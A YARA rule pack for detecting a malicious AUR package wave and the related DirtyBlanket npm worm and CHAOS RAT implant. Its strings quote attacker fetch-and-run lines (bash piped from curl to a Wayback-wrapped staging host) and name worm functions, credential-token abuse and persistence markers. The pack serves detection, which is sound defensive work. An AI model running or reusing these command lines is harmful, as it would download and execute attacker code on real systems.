/*
 * AUR typosquat wave 2026-10-13 (marchos1as / yyay-family)
 * vs DirtyBlanket npm worm 2026-09-29 (npm account "dirtyblanket")
 * ---------------------------------------------------------------
 * Static detection pack. Case: aur_20261019. Written 2026-10-19.
 * All rules are string/structure matches over static file bytes.
 * No rule requires execution. Hashes recorded in meta are SHA-256
 * of artifacts preserved under artifacts/staging/.
 *
 * Sources:
 *  - https://mail-archive.com/aur-general%40lists.archlinux.org/msg02984.html (2026-10-13/14)
 *  - https://www.bleepingcomputer.com/news/security/fake-arch-linux-packages-push-malware-with-root-privileges/ (2026-10-15)
 *  - https://safedep.io/dirtyblanket-express-impersonation-npm/ (2026-09-29)
 *  - https://api.osv.dev/v1/vulns/MAL-2026-17248 (and MAL-2026-17241/42/43/47)
 */

rule AUR_Wave_Install_Scriptlet_Hellscripter
{
    meta:
        description = "AUR .install scriptlet of the 2026-10-13 typosquat wave: top-level bash <(curl -L <Wayback-wrapped gitflic hellscripter/install-scripts linux.sh>) plus decoy emptied post_install/post_upgrade functions (byte-identical output of the DirtyBlanket worm's __do_aur_update template)"
        date = "2026-10-19"
        reference = "https://mail-archive.com/aur-general%40lists.archlinux.org/msg02984.html"
        artifact_hash = "4b46e7374d148e207d2a4b5d2931b16d0fdce83ece2e05823d211c07ac9eb75d"
    strings:
        $url = "https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh" ascii
        $line = "bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts" ascii
        $fn1 = "post_install() {" ascii
        $fn2 = "post_upgrade() {" ascii
    condition:
        filesize < 4096 and $url and ($line or ($fn1 and $fn2))
}

rule DirtyBlanket_AUR_Install_Line_Codeberg
{
    meta:
        description = "AUR .install line as appended by the 2026-09-29 DirtyBlanket worm (_do_aur_update): bash <(curl <Wayback-wrapped codeberg hellscripter/install-scripts linux.sh>) appended at top level of the scriptlet, outside any function"
        date = "2026-10-19"
        reference = "https://safedep.io/dirtyblanket-express-impersonation-npm/"
    strings:
        $line = "bash <(curl 'https://web.archive.org/web/https://codeberg.org/hellscripter/install-scripts" ascii
    condition:
        filesize < 65536 and $line
}

rule DirtyBlanket_Wayback_Staging_URL
{
    meta:
        description = "Internet-Archive-fronted staging URL pattern shared by both campaigns: payload fetched through web.archive.org/web/ from the operator's own hellscripter/install-scripts repo (gitflic.ru or codeberg.org). Blocking the forge host alone does not block delivery."
        date = "2026-10-19"
        references = "https://safedep.io/dirtyblanket-express-impersonation-npm/ | OSV MAL-2026-17241/42/43/47"
    strings:
        $wrap = "web.archive.org/web/https://" ascii
        $g = "gitflic.ru/project/hellscripter/install-scripts" ascii
        $c = "codeberg.org/hellscripter/install-scripts" ascii
    condition:
        $wrap and ($g or $c)
}

rule DirtyBlanket_LinuxWorm_Script
{
    meta:
        description = "The DirtyBlanket linux.sh worm and its 2026-10 evolved variant (gitflic staging HEAD 402781973739d057cf3e91d14fce1fb0c12ca95683e2ba43c035ae43314995dd). SSH known_hosts spreading, AUR .install injection, npm .npmrc token abuse, systemd-fontd persistence. Function names evolved from single-underscore (_do_aur_update, _async_pre_install) to double-underscore (__do_aur_update, __async_post_install)."
        date = "2026-10-19"
        references = "https://safedep.io/dirtyblanket-express-impersonation-npm/ | https://gitflic.ru/project/hellscripter/install-scripts (recovered 2026-10-19)"
        artifact_hash = "402781973739d057cf3e91d14fce1fb0c12ca95683e2ba43c035ae43314995dd"
    strings:
        $f1 = "_do_aur_update" ascii
        $f2 = "__do_aur_update" ascii
        $f3 = "_async_pre_install" ascii
        $f4 = "__async_post_install" ascii
        $f5 = "_use_ssh_key" ascii
        $f6 = "__use_ssh_key" ascii
        $f7 = "_deploy_fontrenderd" ascii
        $f8 = "__deploy_fontrenderd" ascii
        $s1 = "OpenSSH private key" ascii
        $s2 = "known_hosts" ascii
        $s3 = "list-repos" ascii
        $s4 = "chattr +i" ascii
        $s5 = "systemd-fontrenderd" ascii
        $s6 = "shellcheck disable=SC2068" ascii
        $s7 = "Font Rendering Service" ascii
        $s8 = "NPM_CONFIG_USERCONFIG" ascii
    condition:
        filesize < 200000 and (2 of ($f*)) and (4 of ($s*))
}

rule DirtyBlanket_NodeJS_Stage_Loader
{
    meta:
        description = "Stage-one node.js loader: on linux, curl the Wayback-wrapped linux.sh from hellscripter/install-scripts and pipe into bash; commented-out Windows PowerShell branch using example.com placeholder"
        date = "2026-10-19"
        references = "https://safedep.io/dirtyblanket-express-impersonation-npm/"
        artifact_hash = "b4fdaf46a9817f828eb7bc29c9319953a9e06fba2bc2325c972bc25d4ed219d5"
    strings:
        $a = "require(\"child_process\")" ascii
        $b = "process.platform === \"linux\"" ascii
        $c = "| bash" ascii
        $d = "web.archive.org" ascii
    condition:
        filesize < 65536 and all of them
}

rule CHAOS_Implant_SystemdFontd
{
    meta:
        description = "CHAOS RAT client (github.com/tiagorlampert/CHAOS/client) built as systemd-fontd/systemd-fontcached, deployed as a fake systemd font service with Tor SOCKS proxy. Covers both observed builds: SHA-256 2c9dbc14809f1e1aebda114194368b002acf74c8760b88fc101f625d179793c2 (Codeberg era, 2026-09-29) and 4ab643f49ee2a86c36ba665d7a3e5b91997d1da2840d64a0483d2b477c7ca7e0 (GitFlic era, 2026-10-03)."
        date = "2026-10-19"
        references = "https://safedep.io/dirtyblanket-express-impersonation-npm/ | artifacts/staging/systemd-fontd (case aur_20261019)"
        artifact_hash = "4ab643f49ee2a86c36ba665d7a3e5b91997d1da2840d64a0483d2b477c7ca7e0"
    strings:
        $mod = "github.com/tiagorlampert/CHAOS/client" ascii
        $s1 = "app/services/screenshot" ascii
        $s2 = "app/services/terminal" ascii
        $s3 = "app/gateways/client" ascii
        $s4 = "x-client" ascii
        $s5 = "jwt=" ascii
    condition:
        uint32(0) == 0x464C457F and $mod and (2 of ($s*))
}
